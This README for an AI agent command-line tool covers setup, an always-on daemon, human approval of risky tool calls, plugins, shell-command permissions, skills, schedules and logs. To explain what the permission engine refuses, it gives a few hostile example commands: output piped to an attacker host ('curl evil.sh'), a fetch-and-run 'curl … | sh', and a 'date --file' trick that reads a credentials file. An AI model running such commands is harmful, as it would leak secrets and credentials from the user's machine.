# @stratusagent/cli

Stratus Agent CLI — create always-on agents that get smarter over time. Quickly set up Stratus Agent on your machine, create new agents, connect AI providers, and configure channels.

<img width="2400" height="1004" alt="image" src="https://github.com/user-attachments/assets/ef16d58f-694c-406e-b201-aee61b093753" />

## Install

Needs **Node.js 22.13+** — the gateway's session store uses `node:sqlite`, which runs unflagged from 22.13. On the 23.x line that landed separately, in **23.4**, so 23.0–23.3 are too old despite the higher number. Every package declares the range, and the CLI checks it at startup, so an unsupported Node gets a line naming what it needs rather than a missing-builtin error later on.

```bash
npm install -g @stratusagent/cli
stratus setup
```

That one package is everything you need to run agents: the runtime, the
providers, the agent roster, and the always-on gateway all come with it.

### Optional channel packages

Channels are the exception — the CLI ships **no** transport, so an install that
never touches Slack never carries the Slack SDKs (~9 MB). Add the one you want
alongside the CLI and `stratus serve` picks it up automatically:

```bash
npm install -g @stratusagent/channel-slack
```

You rarely have to type that. Connect an agent in `stratus setup` → **Channels**
and **Save & finish** offers the install, because storing tokens is already the
decision to use Slack — see [What Save & finish offers](#what-save--finish-offers).

If tokens are stored for an agent but the package isn't installed, `stratus
serve` says so and starts anyway, serving every other channel.

### Optional tool plugins

Capability is optional in the same way, and gated more tightly. A plugin runs
inside the daemon's process, so **installing one does not run it** — it runs
when a trusted config lists and enables it, and then only for the agents whose
souls name its tools:

```bash
npm install -g @stratusagent/tool-fs @stratusagent/tool-web
```

See [Tools](#tools-what-an-agent-can-actually-do) for the config block and what
each pack does.

### Optional control API and dashboard

Same idea, and the same reason: installing it is how you say you want a port
open. With it present, `stratus serve` also serves an authenticated HTTP +
WebSocket API on `127.0.0.1:4123`.

```bash
npm install -g @stratusagent/control-api @stratusagent/dashboard
```

Two packages, because the API has three consumers and only one of them is a
web page — the macOS app and a headless VM want the API without a UI. Install
`@stratusagent/control-api` alone for those; add `@stratusagent/dashboard` and
the API serves the web UI at `/` as well.

That API is what every non-terminal surface talks to — the web dashboard and
the macOS app alike. Its full reference (endpoints, auth, the event envelope)
lives in [its own README](https://github.com/stratuslabs/agent/tree/main/packages/control-api).

Two files appear while it is serving, both `0600`:

| File | What |
| --- | --- |
| `~/.stratus/gateway-token` | The bearer token clients authenticate with |
| `~/.stratus/gateway.json` | Where the daemon is reachable — url, host, port, pid — removed on a clean stop |

Turn it off with `stratus serve --no-api`, or in `~/.stratus/config.json`:

```jsonc
{
  "api": {
    "enabled": true,
    "host": "127.0.0.1",
    "port": 4123
  }
}
```

Like `approvals`, this block is read **only** from a config you chose
yourself — the global `~/.stratus/config.json` or one passed with `--config`.
An auto-discovered project-local `stratus.config.json` ships in any
repository, and which interface a daemon binds is not a decision a cloned repo
gets to make; one that tries is ignored, loudly.

Localhost is the posture. To reach a machine at home, put it behind a tunnel
(Tailscale is the pattern we recommend) rather than binding a public
interface.

### The dashboard

```bash
stratus dashboard
```

It finds a running daemon through `~/.stratus/gateway.json`, or starts one in
the foreground when there is none (and says which it did). Then it mints a
**single-use, short-lived sign-in link** and opens your browser at it — the
one thing a browser cannot do for itself, since page JavaScript cannot read
`~/.stratus/gateway-token` and a WebSocket upgrade cannot carry a header.

The link works once. Run the command again for another. A daemon restart signs
the browser out too, because its sessions live in memory.

### Talking to a daemon from another machine

`stratus agents --gateway <url>` reads the roster from a running daemon
instead of resolving it locally — the same listing, answered by the API:

```bash
stratus agents --gateway http://127.0.0.1:4123
```

Locally that needs nothing else: the token comes from
`~/.stratus/gateway-token`. A daemon reached through a tunnel has its own
token, so pass it with `--token` or `STRATUS_GATEWAY_TOKEN`.

## Setup

`stratus setup` is the whole onboarding, as a small navigable menu:

```
  1) Providers            anthropic — signed in with your Claude subscription
  2) Models               default claude-opus-5 · fallback gpt-4.1-mini
  3) Agent                ~/.stratus/agents/ava.md
  4) Channels             Slack: 1 agent connected
  5) Always on            stratusd runs after setup, and at every login
  6) Test run             say hello with the current settings
  7) Save & finish
```

- **Providers** — sign in to one or more. For Claude, choose how you pay: a **Claude Pro/Max subscription** (run `claude setup-token`, paste the token — runs route through the Claude Code runtime, so your plan covers usage; requires Claude Code installed and signed in. Tool runs and memory work there too, so it's the same agent as on an API key) or an **Anthropic API key**, pasted straight into the prompt (input is hidden) and checked against the live API when the endpoint supports it — a rejected key is refused; an unreachable endpoint saves the key and verifies it on your first run. OpenAI-compatible services work like API keys, including local models and proxies via a custom base URL. **Codex (ChatGPT)** works either way too: pick the ChatGPT subscription (uses this machine's own `codex login` sign-in — Stratus records the choice and never touches codex's tokens) or paste an OpenAI API key, verified against the platform and passed to codex as `CODEX_API_KEY`. Runs route through the Codex harness with its native shell and web tools disabled, so it is the same agent under the same kernel policy as every other provider.
- **Models** — pick a **default** and a **fallback**, listed live from the provider APIs where possible (subscription sign-ins and offline setups fall back to the known Claude lineup, and codex always lists its known harness lineup — no endpoint serves it). If the default model errors mid-run, the run automatically retries on the fallback — even across providers.
- **Menus are keyboard-driven** — arrow keys (or `j`/`k`) to move, Enter to pick, digits to jump, Esc to go back.
- **Agent** — name your agent (or accept a generated identity), describe their personality, and their soul file lands in `~/.stratus/agents/`, ready to edit.
- **Channels** — put an agent on Slack without opening a file. Pick the agent, and setup prints the app manifest with their name already filled in, walks you through the two tokens (input hidden), verifies each against Slack before accepting it, and stores them where `stratus serve` looks. The list marks who is connected; picking a connected agent offers to replace their tokens or disconnect.
- **Always on** — whether the roster keeps answering once you close the terminal. On by default, because an agent you have to remember to start is not always-on, and every Slack app you connected above stays silent until `stratusd` runs. Save & finish installs it (see [Always on](#always-on)); choose *do not run it for me* and setup removes any service it previously installed.
- **Test run** — say hello with the current settings before saving anything.
- **Save & finish** — writes everything, offers any optional package your
  choices imply, then installs the always-on service.

### What Save & finish offers

The CLI ships no transport and no open port, so a fresh machine finishes setup
missing the packages its own answers just asked for. Setup knows that before
the daemon does — it stored the Slack tokens itself — so **Save & finish** names
what is missing and offers to install it:

```text
2 optional packages are not installed:
  @stratusagent/channel-slack
    Slack tokens are stored for 1 agent(s), but nothing connects to Slack without it.
  @stratusagent/control-api @stratusagent/dashboard
    `stratus dashboard` needs it, and it opens an authenticated port on 127.0.0.1.

Install now with npm install -g?
> Install all of them now
  Install the Slack channel only
  Install the Web dashboard only
  Skip
```

Three things about it worth knowing:

- **It asks, and anything left uninstalled prints its command** — whether you
  skipped the offer entirely or took only one of the two, since choosing one
  group is not a decision about the other. The control API binds a port, and
  installing it is how an operator says they want one open, so this stays a
  question rather than a default.
- **It runs before the service install**, so the LaunchAgent comes up with
  those packages already present. A package installed *after* a daemon starts
  is invisible to it; that ordering is the whole reason the offer lives here
  rather than in a closing hint.
- **A failed install never fails setup.** Your config and credentials are
  already written; you get npm's exit code and the command to run yourself.

Setup only suggests `stratus dashboard` at the end when it can actually work —
a machine that skipped or failed that install is not told to run a command that
would exit with an error.

Credentials are stored in `~/.stratus/credentials.json` (owner-read-only) and settings in `~/.stratus/config.json`, so `stratus run` works from any directory afterwards. No env vars to export, no config files to hand-edit.

## Usage

```bash
stratus setup                          # onboarding menu: providers, models, agent, channels
stratus chat                           # talk — the conversation persists
stratus chat --soul ./ava.md
stratus run "say hello"
stratus run --soul ./ava.md "introduce yourself"
stratus run --provider anthropic --model claude-opus-5 "hello"
stratus run --prompt "use the echo tool" --format json
stratus serve                          # stratusd: the whole roster, always on
stratus serve --idle-timeout 120 --no-events
stratus serve --approvals remote       # ask a human in Slack instead of refusing
stratus service install                # keep stratusd running under launchd/systemd
stratus service status
stratus logs -f                        # what the daemon has been doing
stratus logs --agent ava -n 200
stratus doctor                         # what a run would use right now, and why
stratus update                         # the whole upgrade dance, in the safe order
stratus update --check                 # report what an update would do, do nothing
stratus agent new                      # create an agent (guided on a terminal)
stratus agent new --format soul > ava.md
stratus agents                         # who's on the team: souls, models, memory
stratus schedules                      # what the fleet has scheduled, and where it reports
stratus schedules cancel <id>          # stop the next firing, revoke its destination
stratus dashboard                      # local browser dashboard
```

`stratus serve` runs the gateway in the foreground: every agent in your roster
live at once on its own provider and model, sessions in SQLite so they survive
restarts, delegation between agents, a watchdog for stalled turns, and any
installed channels connected. Ctrl+C or SIGTERM drains cleanly.

### What the daemon will do on its own

Tools declare how much damage they could do — `safe`, `gated`, or
`dangerous` — and the daemon runs only the safe ones without asking. Anything
riskier is refused, with a line in the log saying which agent wanted what:

```text
09:14:36  —           warning: ava: shell.run is gated and nobody is available to approve it (session slack:ava:…)
```

That is the honest default behind a service manager, where there is no
terminal to prompt on. If somebody *is* reachable, `--approvals remote` asks
them instead — see [Asking a human](#asking-a-human-remote-approval).

A tool that declares no risk counts as `gated`, never `safe` — forgetting to
classify something should cost a prompt, not an unattended command. Most
built-in tools (`demo.echo`, `memory.remember`, `memory.recall`,
`memory.forget`, `agent.delegate`, `schedule.list`, `schedule.cancel`) are
`safe`; the built-in exceptions are `schedule.every`, `schedule.at`, and
`message.send`, which are `gated` because they act past the end of the turn —
see [Proactive agents](#proactive-schedules-and-outbound-messages). Anything
you install is where this starts to bite, which is what the
[Tools](#tools-what-an-agent-can-actually-do) section below is about.

A **shell** is the exception to the whole paragraph, because its risk is in
its argument rather than in its identity. `shell.run` is `gated`, and the
permission engine then judges each command: a safe scope (`git status`,
`git log`) runs unattended, everything else asks, and a control operator
anywhere in the string disqualifies it however innocent the base command is.
See [Which commands run unattended](#which-commands-run-unattended).

The line is *acting outside Stratus* — the filesystem, the network, another
service — not cost. Every turn spends provider tokens, including the one
that decided to call a tool, so a policy that gated on spend would have to
gate the conversation itself. Delegation stays `safe` for the same reason:
it hands work to a teammate inside the fleet, that teammate's own tool
calls face this policy again under their allowlist, and the chain is depth
bounded.

`stratus chat` and `stratus run` are unaffected: at a terminal, `--approvals`
works exactly as before (`always`, `ask`, `never`).

### Asking a human: remote approval

In `remote` mode a gated call does not fail — the turn parks, the request is
posted to Slack with **Allow once**, **Always allow**, and **Deny**, and the
turn resumes on the answer. The question goes to the thread the turn is
happening in, so whoever is talking to the agent sees it where they already
are.

Turn it on for the daemon with `--approvals remote`, or in
`~/.stratus/config.json` so the installed service picks it up too:

```jsonc
{
  "approvals": {
    "mode": "remote",              // headless (default) or remote
    "timeoutMs": 900000,           // unanswered after 15 minutes → denied (max 2147483647)
    "slackApprovers": ["U01OPS"],  // who may decide, for every agent
    "slackChannel": "C07OPS",      // where to ask when the turn isn't in Slack
    "agents": {
      "ava": { "slackApprovers": ["U01DYLAN"] }
    }
  }
}
```

An agent inherits the top-level route key by key, so `ava` above asks her own
approver in the shared `C07OPS` fallback channel. An explicit
`"slackApprovers": []` on an agent excludes it from the default list — that
agent's gated calls are then denied outright — while omitting the key
inherits.

**Only a config you chose is allowed to set this block** — `--config`,
`STRATUS_CONFIG`, or the global `~/.stratus/config.json`. An auto-discovered
project-local `stratus.config.json` outranks the global one for provider
settings, but it can be checked into any repository, and appointing the
people who may authorize an agent's tool calls is not something a clone gets
to do. Its `approvals` block is ignored, with a warning naming the file.

Three things are worth knowing before you turn it on:

- **Approvers are people, not places.** Posting into a channel does not make
  everyone in it an approver: each request is bound to the ids configured for
  that agent, and anyone else's click is refused with a notice only they see.
  The request stays open for someone who may actually answer it. This matters
  most for **Always allow**, which widens what the agent may do unattended.
- **An agent with no approver configured is denied immediately**, not left to
  time out — `remote` with nobody listed behaves exactly like `headless`. If
  no channel can ask for an agent at all (no Slack tokens for it, or
  `@stratusagent/channel-slack` not installed) there is nothing to render the
  request, so its gated calls wait out the timeout instead. The daemon names
  those agents at startup, rather than leaving you to find out at 3am:

  ```text
  approvals: remote — gated calls are parked and asked in Slack (approvers set for ava)
  ```
- **A parked turn survives a restart.** The daemon records what has not run
  before it asks, so an approval outstanding when it stops is finished when
  it starts again — the question is re-asked in Slack, the call runs on the
  answer, and anything queued behind it still runs too. The re-asked request
  keeps the window it started with rather than getting a fresh one, and a
  wait that has already used up its `timeoutMs` is denied instead of
  re-asked: downtime is not a reason to extend a security decision.
- **A turn that was mid-flight is failed, not left hanging.** Parking is the
  one state a restart can resume from — a turn that stopped anywhere else
  (waiting on the provider, inside a tool, or on an approval asked by an
  agent billed through a Claude subscription, which is deliberately not
  checkpointed) cannot be. Those sessions come back marked `failed`, with a
  reason saying stratusd stopped while they were running and to send the
  message again, rather than claiming to still be running forever. This is
  only for an ungraceful stop: a normal restart denies what is parked and
  finishes the turns those denials release before it exits. The thread hears
  about it too: a turn that fails with nobody rendering it is reported where
  it was asked, rather than going quiet and reading as an agent that never
  replied.
- **A button left behind by a dead daemon corrects itself when clicked.** A
  normal shutdown retracts its buttons; a crash cannot, and the new process
  has no record of what the old one posted. Clicking such a prompt tells you
  it is no longer pending *and* rewrites the message so the next reader is
  not offered a decision nothing is waiting for. A prompt nobody clicks
  stays as it is.
- **Always allow means different things for a tool and for a command.** For
  an ordinary tool it lasts for the session: it stops that tool asking again
  in the same conversation, and it is forgotten when the daemon restarts.
  For a call that carries a command — `shell.run` — it persists a *scope*
  instead, in `~/.stratus/agents/<id>.whitelist.json`, and that survives a
  restart. See below for what a scope keeps out.

The request shows the tool's **arguments**, not just its name — for anything
whose danger lives in what it was called with, approving a bare tool name is
approving something you cannot see. Arguments are escaped (a model-written
argument cannot mention or broadcast to the workspace through the prompt)
and truncated with a visible notice when they are long.

Requests are also denied — visibly, with a reason — when they expire, when
the turn is cancelled, when the daemon shuts down, and when a turn reaches a
gated call while the daemon is already stopping. Every one of those retracts
the buttons in Slack, so a message never keeps offering a decision with
nowhere to land.

`timeoutMs` is capped at 2147483647 (~24.8 days), the longest timer Node can
hold. A larger value is rejected at startup rather than accepted: it would
not wait longer, it would expire every approval almost immediately.

Approval buttons need the Slack app's **Interactivity** switched on. Apps
created from the manifest that `stratus setup` prints already have it; an app
created before this shipped needs it enabled once, in its App Manifest.

## Tools: what an agent can actually do

Out of the box an agent can echo, remember, recall and forget its own
memories, and delegate. Everything else —
files, a shell, the web, a browser — arrives as a **plugin**: one package you
install, list, and enable.

```bash
npm install -g @stratusagent/tool-fs @stratusagent/tool-shell \
                @stratusagent/tool-web @stratusagent/tool-browser
```

```jsonc
// ~/.stratus/config.json
{
  "plugins": {
    "@stratusagent/tool-fs": {
      "enabled": true,
      "roots": ["~/notes"],
      "agents": {
        "ava":  { "roots": ["~/work/ava"] },
        "juno": { "roots": ["~/work/juno", "~/shared"] }
      }
    },
    "@stratusagent/tool-web": { "enabled": true },
    "@stratusagent/tool-shell": { "enabled": true, "cwd": "~/work" }
  }
}
```

Keyed by **package name**, because a plugin's identity is its package and one
may contribute more than tools. Per-agent settings go in an `agents` sub-block
over the defaults above them — the same shape `approvals` already uses, and it
matters more here: for `tool-fs` those values are an access boundary between
agents rather than a preference.

**Only a config you chose may list plugins** — `--config`, `STRATUS_CONFIG`, or
the global `~/.stratus/config.json`. A plugin runs in the daemon's own process,
so this list is a list of code, and an auto-discovered project-local
`stratus.config.json` ships with any repository you clone. Its `plugins` block
is ignored, with a warning naming the file, exactly as `api` and `approvals`
are.

`stratus run` and `stratus chat` load the same plugins from the same config, so
a tool that works locally works in the daemon, and one that is missing is
missing in both.

### Installing a plugin grants no agent anything

The soul's allowlist is the second gate, and the per-identity one:

```markdown
---
id: ava
tools: [fs.read, fs.search, web.fetch]
---
```

`fs.*` grants a whole toolset, so an agent given "the filesystem" does not need
editing every time the pack gains a tool. The prefix keeps its dot: `fs.*`
never matches `fsx.read`. Listing nothing grants every registered tool, which
is fine for a private agent and is not what you want once a shell is installed.

### What is available

| Package | Tools | Risk |
| --- | --- | --- |
| [`@stratusagent/tool-fs`](../tool-fs) | `fs.read`, `fs.list`, `fs.search` | `safe` inside the agent's roots |
| | `fs.write` | `gated` |
| [`@stratusagent/tool-shell`](../tool-shell) | `shell.run` | `gated`, then judged per command |
| [`@stratusagent/tool-web`](../tool-web) | `web.fetch` | `gated` |
| [`@stratusagent/tool-browser`](../tool-browser) | `browser.goto`, `.read`, `.screenshot` | `gated` |
| | `browser.act` | `dangerous` — always a human |
| [`@stratusagent/plugin-mcp`](../plugin-mcp) | `mcp.<server>.<tool>` — any MCP server's tools, discovered at connect | `gated`, whatever the server says; per-tool `toolRisks` overrides |

Each package's README carries its own settings and the reasoning behind its
risk levels. Three things are worth knowing here:

- **`tool-fs` roots are a boundary, not a preference.** No roots means no
  filesystem — nothing is readable, rather than everything. Containment is
  decided between real paths, so a symlink inside a root pointing at
  `~/.stratus/credentials.json` is refused, and so is a write *through* a
  symlinked directory.
- **`tool-shell` replaces the environment.** The command gets exactly what
  you granted (`passEnv`, `env`) and nothing else — the daemon's own
  environment, where `ANTHROPIC_API_KEY` lives, is not there to read.
- **`tool-web` and `tool-browser` refuse local addresses.** Both share one
  policy: `http:`/`https:` only, and no loopback, RFC 1918, link-local
  (`169.254.169.254`), or IPv6 unique-local — including the IPv4-mapped and
  NAT64 spellings of the same addresses. It is enforced on the connection,
  so a redirect or a DNS answer cannot walk an agent into your metadata
  endpoint. `allowedHosts` opens a specific one when you mean to.
- **`plugin-mcp` mounts somebody else's code.** Each configured MCP server's
  tools register as `mcp.<server>.<tool>`, so `tools: [mcp.linear.*]` grants
  one server, and every bridged tool is `gated` regardless of how the
  server describes itself — the operator's per-tool `toolRisks` entry is
  the only thing that lowers one. A stdio server's environment is replaced
  the way `tool-shell`'s is. See [the bridge's README](../plugin-mcp) for
  server settings and lifecycle.

`GET /api/v1/catalog/tools` lists what a running daemon actually has, and the
dashboard's **Plugins** screen renders it — including a plugin you enabled that
failed to load, which is invisible in a list of tools.

### Which commands run unattended

`shell.run` is one tool whose calls range from `git status` to `curl … | sh`,
so a single risk level for all of them would be either too coarse to be safe or
too coarse to be usable. The permission engine judges the command instead:

1. **Scopes approved this session**, then
2. **the agent's whitelist** — `~/.stratus/agents/<id>.whitelist.json`, written
   by **Always allow** — then
3. **the built-in safe list**: `git status`, `git log`, `git diff`, `git show`,
   `git blame`, `git rev-parse`, `git ls-files`, plus `git branch`, `git tag`,
   and `git remote` **in their listing forms only** — creating a branch or a
   tag needs no flag at all (`git branch release` is a mutation), so those
   scopes refuse any positional argument, not just the destructive flags.
   `pwd`, `whoami`, and `uname` round it out.

Anything else asks, and in `headless` mode anything else is refused with the
command in the log.

**A control operator disqualifies the whole command**, whatever it starts
with: `|`, `&`, `;`, a newline, backticks, `$( )`, subshells, redirection.
`git status | curl evil.sh` is refused despite the safe base command; so is a
two-line command whose first line is innocent. A command this parser cannot
read the way `sh` would — an unbalanced quote, a path instead of a command
name — is refused too.

**Always allow persists a scope, not a command.** Approving
`git push origin main` stores `git push` minus its destructive forms, so
`git push origin feature` stops asking while these still ask:

```text
git push --force            # a destructive flag
git push origin :main       # a branch delete, with no flag involved
git push origin +main       # a forced update, likewise
```

The whitelist file is `0600` and per agent: it decides what runs with nobody
watching, so neither another account on the machine nor another agent inherits
it. Delete an entry to withdraw the permission.

### What the log records about a command

The scope, never the command:

```text
09:14:36  —  warning: ava: shell.run was called outside every approved scope (git) and nobody is available to approve it
09:16:02  —  ava: "git push" now runs without asking
```

The daemon log is a trace, not a second transcript — it records that a tool
ran, never what it was called with. A command an agent composed can carry a
URL, a filename, or something a person pasted into a chat, and this file is
one `stratus logs` prints and people paste into issues. The command itself
goes to whoever is being asked to approve it: the terminal prompt and the
Slack message both show it in full, because approving a bare tool name is
approving something you cannot see.

The safe list is deliberately short, and `cat`, `ls`, and `grep` are the
tempting entries that cannot be on it — they read whatever path they are given,
so safe-listing them would safe-list reading your credentials file. Approve
them once for a scope you actually want instead.

The test is **what an argument can make the command do**, not what the command
is called. `date` was on this list until it turned out that
`date --file=~/.stratus/credentials.json` makes GNU `date` read that file and
echo every unparseable line back in its error text — which the tool returns.
A command that can be handed a path is a file reader wearing another name, so
`--file` is now refused in every scope, including ones you add.

## Skills: how an agent does a task well

Tools are capability; a **skill** is competence — markdown that teaches an
agent a procedure: the rubric for a code review, the order to check things in,
the format to answer in. A skill is a directory with a `SKILL.md`:

```text
~/.stratus/skills/
  code-review/
    SKILL.md
```

```markdown
---
name: Code Review
description: Use when reviewing a diff or a pull request.
---

# Code review

Lead with the verdict, then findings ordered by severity...
```

The frontmatter is the soul dialect — `name`, `description`, optional
`version`, and an optional `requires:` list of toolsets the procedure expects
(`browser.*`) — read **tolerantly**, unlike a soul's: keys other ecosystems
write (`license`, `allowed-tools`, nested `metadata:`) and YAML's multi-line
descriptions are skipped rather than refused, so a skill published for
another agent loads here unmodified. The directory name is the skill's id.
Plugins can ship skills too, declared in their manifest; those are addressed
by the package name verbatim (`stratus-plugin-github:pr-review`), and by the
bare id while no other package claims it.

### Installing skills

Anything on GitHub laid out as skill directories — including repos published
to [skills.sh](https://skills.sh) — installs directly:

```bash
stratus skill add owner/skills-repo          # a whole repo of skills
stratus skill add owner/repo --skill hn-search --agent ava
stratus skill add ./my-skills                # a local directory
stratus skills                               # what is installed, and who enables it
```

`skill add` takes a GitHub `owner/repo`, any git URL, or a local path; it
finds skills at the repo root, one level down, and in the `skills/`,
`.claude/skills/`, and `.agents/skills/` directories the ecosystem uses, then
copies each **whole directory** into `~/.stratus/skills/`. An id already
installed is refused per skill (`--force` replaces it), and an unparseable
skill is reported while the rest still install.

**Installed is not enabled.** A skill is markdown, but it is markdown your
agent will *follow*, so installing a repo grants no agent anything — each
soul still opts in through `skills:`. Pass `--agent <id>` to do both at once:
the command appends the installed ids to that soul's list (rendering the file
through the canonical formatter, like the API's field edits do).

An agent gets a skill only when its soul asks — same allowlist shape as
`tools:`, except that omitting it means **none** (a skill silently changing
how an agent behaves is worse than an agent that has to be told):

```markdown
---
name: Ava
tools: [fs.read, fs.search]
skills:
  - code-review
  - stratus-plugin-github:*
---
```

**An enabled skill costs one line per turn, not its body.** Only the name and
description reach the system prompt; the agent loads the full procedure with
the built-in `skill.read` tool when the description says it is relevant. That
is what lets a fleet carry thirty procedures without every turn paying for all
thirty. `skill.read` is part of the skills mechanism — never list it under
`tools:`; it appears (and works) for exactly the agents whose soul enables any
skill, and reads only the skills that soul allows.

**Write the description for routing.** It is the only thing the model sees
before deciding to load the body, so it says *when to reach for this*, not
what the file contains: "Use when reviewing a diff or a pull request", not "A
rubric with twelve sections". A skill without a description does not load.

A skill whose `requires:` names toolsets the agent's `tools:` does not cover
is a warning when the daemon loads the roster, never a refusal — a skill is
prose, and can degrade. `stratus run` and `stratus chat` serve the same skills
directory the daemon does, so a skill that routes locally routes in Slack.

## Proactive: schedules and outbound messages

Everything above answers when spoken to. Two toolsets make an always-on
daemon into agents that act on their own:

- **`schedule.every` / `schedule.at`** — recurring (an interval like `"30m"`
  or a five-field cron expression, local time) or one-shot (ISO-8601), with
  the prompt each firing runs and, optionally, the destination its reports
  are pre-authorized to post to.
- **`schedule.list` / `schedule.cancel`** — an agent's own audit and undo.
- **`message.send`** — post to a channel or DM outside the current
  conversation: `{ destination: { channel: "slack", to: "C0123456789" }, text }`.
  Without it a scheduled turn works in silence.

Souls opt in like any other tool:

```markdown
---
name: Ava
tools:
  - schedule.*
  - message.send
---
```

**The approval belongs to the schedule, not to the firing.** Creating a
schedule is `gated`: a human approves "every morning, check the repo, report
to #eng" once — cadence, prompt, and destination together. A `message.send`
from that schedule's firings *to that destination* then runs unattended, in
headless mode included: it is the decision already made, not a new one.
Anywhere else — another channel, a DM, a schedule that declared no
destination — stays gated exactly as in an inbound turn, so under `headless`
it is refused and under `remote` it asks in Slack (in the configured
`approvals.slackChannel`, since a scheduled turn has no thread of its own).
Note that a plain **Allow once** on `schedule.every` therefore mints
something durable — the request shows the cadence, prompt, and destination,
because that is what is being approved.

The rest of the shape, briefly:

- **Each firing is its own session** (`schedule:<id>:<slot>`), dispatched
  through the same path a channel message takes, marked
  `scheduled: true` in metadata. Continuity across firings is what agent
  memory is for.
- **Schedules are immutable.** Editing is cancel-plus-create, so the
  approval's scope is exactly the row's lifetime.
- **A destination is validated at creation** — the agent's Slack app must be
  able to see the conversation and be a member of it — so a schedule that
  could never report is refused while somebody is present to hear why, not
  at 6am. The same membership check runs on every send: no cold-DMing.
- **Schedules survive restarts** (they live in the daemon's own database),
  a slot is consumed *before* its firing dispatches so a crash mid-firing
  never double-runs it, and a missed window gets at most one late catch-up —
  windows that passed entirely are skipped with a log line.
- **Two limits hold unattended spend down**: an interval floor (default one
  minute) and a per-agent cap on concurrent scheduled turns (default one —
  a firing that would exceed it waits for the next tick).

What the fleet has set is never only the agents' business:

```bash
stratus schedules                    # every agent's schedules, straight from the daemon's database
stratus schedules cancel <id>        # stop the next firing; the destination grant dies with the row
```

Cancelling — from the CLI, the control API (`DELETE /schedules/:id`), or the
agent's own `schedule.cancel` — revokes the pre-authorized destination in the
same stroke, and a running daemon notices without a restart. The daemon log
records that a schedule was created, fired, or cancelled (ids and
destinations, never prompt contents beyond the row itself).

## Always on

`stratus serve` stays a foreground process on purpose — debuggable, and
composable with whatever supervisor you already run. Surviving logout, crashes,
and reboots is the platform's job, so `stratus service` hands the daemon to
launchd on macOS and to systemd on Linux:

```bash
stratus service install          # write the unit, start now, start at every login
stratus service install --no-login
stratus service status
stratus service start
stratus service stop
stratus service uninstall
```

`stratus setup` installs it for you at Save & finish unless you opt out, so
most people never run these by hand. What they get:

- **macOS** — a LaunchAgent at `~/Library/LaunchAgents/com.stratusagent.stratusd.plist`
- **Linux** — a systemd user unit at `~/.config/systemd/user/stratusd.service`

The unit runs the daemon by **absolute path** — the node binary and script of
the process that installed it, never a bare `stratus`. A service manager starts
with a minimal environment and never loads the shell profile that puts `stratus`
on your `PATH`. It stops with SIGTERM, so the gateway's drain actually runs.

A default install restarts the daemon if it crashes, but not after a clean
exit — stopping it yourself keeps it stopped. **`--no-login` gives up crash
restarts on macOS**, and that is launchd's rule rather than a choice: `KeepAlive`
implies `RunAtLoad`, so a job that must not start at login cannot ask to be
revived either. `stratus service install --no-login` says so when it finishes.
On Linux the two are independent, and `Restart=on-failure` applies either way.

`status` asks the service manager, not the unit file, whether the daemon is
alive, and exits non-zero when it isn't — so it works in a health check:

```text
stratusd  running
  manager   launchd
  unit      ~/Library/LaunchAgents/com.stratusagent.stratusd.plist
  at login  yes
```

**One limit worth knowing before you rely on it.** A LaunchAgent starts at
**login, not at power-on**, and only while that user is logged in — an
unattended Mac needs automatic login turned on too. (A `LaunchDaemon` would
start without a login, but it runs as a system user, which breaks `~/.stratus`
paths and the Claude subscription token entirely, so the LaunchAgent is the
right choice.) The systemd equivalent is `loginctl enable-linger` on a machine
you don't stay logged in to. Setup says both in the menu rather than leaving
them to be discovered after a reboot.

## Updating

`~/.stratus` is a real on-disk format — config, credentials, souls, memory,
the session database — so upgrading is more than `npm install -g`. Two pieces
handle it:

**State is versioned, and migrations run themselves.** `~/.stratus/state.json`
records a schema version and which migrations have been applied. On the first
command of a newer build — whatever installed it: npm directly, Homebrew, a
pinned version in CI — any pending migrations run automatically, each one
idempotent, applied in order, and recorded as it completes. This is deliberate:
an upgrade path that migrates only through one blessed command leaves the
other install methods on unmigrated state, and the two populations diverge
silently. (One constraint that keeps the automatic path honest: a migration
must be safe to run while a daemon is serving, because this path does not
stop the managed service — only `stratus update` does. A migration needing
exclusive access to shared state is not registered until the registry can
require that bracket.)

The reverse direction refuses instead of guessing: against state stamped by
a **newer** build than itself, anything that *writes* under `~/.stratus` —
`serve`, `setup`, `chat`, `run`, `skill add`, `dashboard`, `schedules
cancel`, `service install`/`start` — refuses with a line naming the fix,
because a downgraded build writing into a newer format is the one way to
corrupt it. Read-only commands (`logs`, `agents`, `doctor`, `service
status`/`stop`) warn and continue: reading is how you diagnose your way out.

**`stratus update` does the operational sequence around that, in the order
that cannot lose data:**

```bash
stratus update            # stop stratusd → upgrade from npm → migrate →
                          # rewrite the service unit → restart
stratus update --check    # report all of it, change nothing (exits 1 when
                          # something is actionable, for scripts and cron)
```

The service stop comes first so no daemon holds the session database while
state changes, and the unit rewrite is the step nothing else performs: the
unit runs the daemon by **absolute paths** (see [Always on](#always-on)), so
upgrading node — under nvm, a whole new version directory — leaves the unit
pointing at an interpreter that no longer exists. The service stops working
and nothing says so; the agents just stop answering. `stratus update` rewrites
the unit with the current node and entrypoint paths, preserving its `--config`
pin and login setting, and `stratus doctor` flags a stale unit path as a
problem. Every step degrades independently — with npm unreachable, `update`
skips the package upgrade but still migrates and repairs the unit, which is
exactly what the offline case needs. A daemon that was deliberately stopped
before the update is left stopped after it.

## Logs

Under a service manager the daemon's stdout is gone, so everything `stratus
serve` says is also written to `~/.stratus/logs/stratusd.jsonl` (owner-read-only,
rotated at 8 MB, three generations kept). That file is the record of an
overnight run, and `stratus logs` reads it from any terminal:

```bash
stratus logs                     # the last 50 records
stratus logs -f                  # follow, across rotations
stratus logs -n 200
stratus logs --agent ava
stratus logs --session slack:ava:T01ABCDEF:C07GHIJKL:1731900000.123456
stratus logs --format json       # the raw records, for jq
```

```text
09:14:02  —           stratusd ready — 3 agents, slack connected
09:14:31  ava         session.created [slack:ava:T01ABCDEF:C07GHIJKL:1731900000.123456]
09:14:36  ava         tool.completed tool=memory.remember ok=true [slack:ava:T01ABCDEF:C07GHIJKL:1731900000.123456]
09:21:07  —           warning: anthropic returned 529; retrying on the fallback model
```

Session ids are the channel's own key — `channel:agent:team:conversation[:thread]`
— so the id in the last column is exactly what `--session` wants, and the same
conversation keeps it across daemon restarts.

The log is a **trace, not a second transcript**: it records that a tool ran and
that a session completed, with the tool's name, the agent, and the session id.
Prompts, replies, and tool inputs are not written — what was said lives in the
session store instead. A memory write or forget also records the **entry id**
it touched (never the fact itself), so "when did the agent learn this" has an
answer.

One exception worth knowing before you paste a log anywhere. A failed session
records the **provider's error text verbatim**, and providers routinely quote
the request that failed — so a malformed prompt can end up inside an error
message. Skim a log before sharing it, and prefer `--agent` or `--session` to
narrow it to the run you actually mean.

### When the log is empty

